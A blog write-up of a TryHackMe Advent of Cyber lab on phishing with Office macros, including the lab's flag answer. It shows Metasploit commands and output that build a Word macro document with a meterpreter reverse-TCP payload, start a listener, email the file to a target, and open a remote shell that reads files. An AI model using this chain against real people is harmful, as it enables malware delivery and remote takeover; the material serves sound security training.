---
title: "Advent of Cyber - Day 10 Phishing"
date: 2024-12-19 12:00:00 -500 
categories: [Advent of Cyber - Tryhackme, Day 10]
tags: [siem,exploit,flags,tryhackme,pentestingl,xxe]
author: Christoph K
---
[Advent of Cyber - Day 10  ](https://tryhackme.com/r/room/adventofcyber2024)


## Learning Objectives

- Understand how phishing attacks work
- Discover how macros in documents can be used and abused
- Learn how to carry out a phishing attack with a macro 


### Phishing Attacks 

Security is as strong as the weakest link! Often the human is the weakest link in this chain. That is where `Phishing` comes into place. It has a similar meaning like the word `fishing`. It works with `bait`to a usually large group of target users. Furthermore attacker often craft their messages with a sense of `urgency` so the user should take immediate action without thinking critically. 

The goal is to steal personal information or instlaling malware, usually by convincing the target user to fill out a form, open a file or click a link. 


### Macros

The needs of MS Office users can be vastly different, and there is no way that a default installation would cater to all of these needs. In particular, some users find themselves repeating the same tasks, such as formatting and inserting text or performing calculations. Consider the example of number-to-words conversion where a number such as “1337” needs to be expressed as “one thousand three hundred thirty-seven”. It would take hours to finish if you have hundreds of numbers to convert. Hence, there is a need for an automated solution to save time and reduce manual effort.

In computing, a macro refers to a set of programmed instructions designed to automate repetitive tasks. MS Word, among other MS Office products, supports adding macros to documents. In many cases, these macros can be a tremendous time-saving feature. However, in cyber security, these automated programs can be hijacked for malicious purposes.

To add a macro to an MS Word document for instance, we click on the View menu and then select Macros as pointed out by 1 and 2 in the screenshot below. We should specify the name of the macro and specify that we want to save it in our current document, as indicated by 3 and 4. Finally, we press the Create button.


## Tasks
- What is the flag value inside the flag.txt file that’s located on the Administrator’s desktop?



### What is the flag value inside the flag.txt file that’s located on the Administrator’s desktop?


First we build a malicious macro embedded in a MS Office document. We can use `metasploit` to do that. 

First we want to create a `tcp reverse connection`. Therefore we use following payload: 


- We used `set payload` for specify the payload we want to use 
- `use exploit` is the exploit we want to use, in this case `macros`


```bash

msf6 > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 > use exploit/multi/fileformat/office_word_macro
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/fileformat/office_word_macro) > set LHOST 10.11.110.106
LHOST => 10.11.110.106
msf6 exploit(multi/fileformat/office_word_macro) > set LPORT 4444
LPORT => 4444
```

Next step is, we set the `parameters` for `LHOST`and `LPORT`. This is our system! We specify the parameters for the `reverse_tcp` connection, where to connect and which port to use!

```bash
Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.11.110.106    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


```
And now we use `exploit` to create such file. 

``` bash

msf6 exploit(multi/fileformat/office_word_macro) > exploit

[*] Using template: /opt/metasploit-framework/embedded/framework/data/exploits/office_word_macro/template.docx
[*] Injecting payload in document comments
[*] Injecting macro and other required files in document
[*] Finalizing docm: msf.docm
[+] msf.docm stored at /home/admin/.msf4/local/msf.docm
msf6 exploit(multi/fileformat/office_word_macro) >
```

We have now created a malicious file with a `tcp reverse connection`. 

Path: `home/admin/.msf4/local/msf.docm`


Now lets prepare our `listener`via `metasploit`:

```bash

msf6 exploit(multi/fileformat/office_word_macro) > use multi/handler
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.110.106
LHOST => 10.11.110.106
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444

.
.
.
```

Now our `listener` listens to the Port `4444` and our `IP address`.

Our victom has to click the link now. For that we connect to the mailserver and send the macro file to the user.

![mail](assets/img/tryhackme/cyberadvent/day10/01.png )


Now we press `exploit` in our `metasploit session`:

```bash


[*] Started reverse TCP handler on 10.11.110.106:4444
[*] Sending stage (176198 bytes) to 10.10.102.140
[*] Meterpreter session 1 opened (10.11.110.106:4444 -> 10.10.102.140:49940) at 2024-12-22 15:26:09 +0100

meterpreter >
```

We have a connection to the victim! Now we search the flag:


```bash

meterpreter > cd C:/Users/Administrator/Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  527   fil   2016-06-21 17:36:17 +0200  EC2 Feedback.website
100666/rw-rw-rw-  554   fil   2016-06-21 17:36:23 +0200  EC2 Microsoft Windows Guide.website
100666/rw-rw-rw-  282   fil   2021-03-17 16:13:27 +0100  desktop.ini
100666/rw-rw-rw-  23    fil   2024-11-12 04:42:45 +0100  flag.txt

meterpreter > cat flag.txt
THM{PHISHING_CHRISTMAS}meterpreter >
```

Answer:`THM{PHISHING_CHRISTMAS}` 

### Thoughts

Very nice concept and nice teaching how to create a `reverse tcp connection` into a word file via `metasploit` and send this as mail to a victim! 
Thanks for the fun room! 